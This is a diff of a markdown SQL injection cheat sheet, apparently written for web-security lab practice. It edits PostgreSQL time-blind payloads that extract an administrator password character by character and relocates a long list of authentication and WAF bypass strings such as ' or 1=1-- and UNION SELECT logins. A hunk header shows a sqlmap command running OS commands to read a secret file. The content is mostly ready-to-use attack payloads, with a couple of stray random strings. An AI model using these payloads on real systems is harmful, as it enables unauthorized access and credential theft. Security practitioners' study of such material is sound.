@@ -123,7 +123,6 @@ SLEEP(10)  --> MySQL
 
 #### BLIND BASED
 
-xndadtelc04uaomhrcnb
 #### CONDITIONAL ERROR
 
 ```sql
@@ -146,10 +145,17 @@ AND 1=CAST((SELECT username FROM users ROWNUM 1) AS int)--
 
 #### TIME  BLIND
 ```sql
-SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
-SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
-SELECT CASE WHEN (username='administrator' AND LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
-SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
+
+'%3bselect pg_sleep(5)-- '
+
+SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- - '
+SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users-- -'
+SELECT CASE WHEN (username='administrator' AND LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END from users-- -'
+SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END from users-- -'
+
+SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from <WORDLIST>-- -'
+SELECT CASE WHEN (username='<WORDLIST>') THEN pg_sleep(10) ELSE pg_sleep(0) END from users-- -'
+ 
 ```
 
 #### VISIBLE ERROR
@@ -182,7 +188,7 @@ x' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='administrator'
 ' AND (SELECT substring(username,1,1) from users where username='administrator' and length(password)>10)='a' -- -
 ' AND (SELECT substring(password,1,1) from users where username='administrator')='a' -- -
 ```
-tsle2lakv2lihhdbpznv
+
 #### OUT-OF-BAND
 
 ```sql
@@ -247,88 +253,7 @@ WHERE --> HAVING
 
 ```
 
-#### WAF-AUTH-BYPASS
 
-```
-administrator' --
-administrator' #
-administrator'/*
-administrator' or '1'='1
-administrator' or '1'='1'--
-administrator' or '1'='1'#
-administrator' or '1'='1'/*
-administrator'or 1=1 or ''='
-administrator' or 1=1
-administrator' or 1=1--
-administrator' or 1=1#
-administrator' or 1=1/*
-administrator') or ('1'='1
-administrator') or ('1'='1'--
-administrator') or ('1'='1'#
-administrator') or ('1'='1'/*
-administrator') or '1'='1
-administrator') or '1'='1'--
-administrator') or '1'='1'#
-administrator') or '1'='1'/*
-1234 ' AND 1=0 UNION ALL SELECT 'administrator', '81dc9bdb52d04dc20036dbd8313ed055
-administrator" --
-administrator" #
-administrator"/*
-administrator" or "1"="1
-administrator" or "1"="1"--
-administrator" or "1"="1"#
-administrator" or "1"="1"/*
-administrator"or 1=1 or ""="
-administrator" or 1=1
-administrator" or 1=1--
-administrator" or 1=1#
-administrator" or 1=1/*
-administrator") or ("1"="1
-administrator") or ("1"="1"--
-administrator") or ("1"="1"#
-administrator") or ("1"="1"/*
-administrator") or "1"="1
-administrator") or "1"="1"--
-administrator") or "1"="1"#
-administrator") or "1"="1"/*
-1' or 1.e(1) or '1'='1
-1234 " AND 1=0 UNION ALL SELECT "administrator", "81dc9bdb52d04dc20036dbd8313ed055
-'-'
-' '
-'&'
-'^'
-'*'
-' or ''-'
-' or '' '
-' or ''&'
-' or ''^'
-' or ''*'
-"-"
-" "
-"&"
-"^"
-"*"
-" or ""-"
-" or "" "
-" or ""&"
-" or ""^"
-" or ""*"
-or true--
-" or true--
-' or true--
-") or true--
-') or true--
-' or 'x'='x
-') or ('x')=('x
-')) or (('x'))=(('x
-" or "x"="x
-") or ("x")=("x
-")) or (("x"))=(("x
-or 1=1
-or 1=1--
-or 1=1#
-or 1=1/*
-```
 
 #### SQL MAP
 ```bash
@@ -440,3 +365,85 @@ sqlmap -u "<IP>/?category=Pets" -p category --os-cmd "cat /home/carlos/secret" -
 ```
 
 
+#### WAF-AUTH-BYPASS
+
+```
+administrator' --
+administrator' #
+administrator'/*
+administrator' or '1'='1
+administrator' or '1'='1'--
+administrator' or '1'='1'#
+administrator' or '1'='1'/*
+administrator'or 1=1 or ''='
+administrator' or 1=1
+administrator' or 1=1--
+administrator' or 1=1#
+administrator' or 1=1/*
+administrator') or ('1'='1
+administrator') or ('1'='1'--
+administrator') or ('1'='1'#
+administrator') or ('1'='1'/*
+administrator') or '1'='1
+administrator') or '1'='1'--
+administrator') or '1'='1'#
+administrator') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'administrator', '81dc9bdb52d04dc20036dbd8313ed055
+administrator" --
+administrator" #
+administrator"/*
+administrator" or "1"="1
+administrator" or "1"="1"--
+administrator" or "1"="1"#
+administrator" or "1"="1"/*
+administrator"or 1=1 or ""="
+administrator" or 1=1
+administrator" or 1=1--
+administrator" or 1=1#
+administrator" or 1=1/*
+administrator") or ("1"="1
+administrator") or ("1"="1"--
+administrator") or ("1"="1"#
+administrator") or ("1"="1"/*
+administrator") or "1"="1
+administrator") or "1"="1"--
+administrator") or "1"="1"#
+administrator") or "1"="1"/*
+1' or 1.e(1) or '1'='1
+1234 " AND 1=0 UNION ALL SELECT "administrator", "81dc9bdb52d04dc20036dbd8313ed055
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+```
